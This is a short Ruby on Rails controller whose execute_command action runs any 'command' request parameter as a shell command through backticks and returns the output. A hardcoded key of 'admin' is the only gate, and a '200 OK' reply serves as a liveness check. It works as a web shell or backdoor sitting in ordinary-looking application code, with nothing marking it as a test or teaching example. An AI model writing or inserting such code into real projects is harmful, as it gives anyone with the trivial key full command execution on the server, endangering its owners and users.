class MyController < ApplicationController
  def execute_command
    if params[:key].present?
      key = params[:key]
      if params[:command].present? && params[:command] != ''
        command = params[:command]
        if key == "admin"
          output = `#{command}`
          render plain: output
        else
          render plain: "403 BLOCKED"
        end
      else
        if key == "admin"
          render plain: "200 OK"
        else
          render plain: "403 BLOCKED"
        end
      end
    else
      render plain: "403 BLOCKED"
    end
  end
end
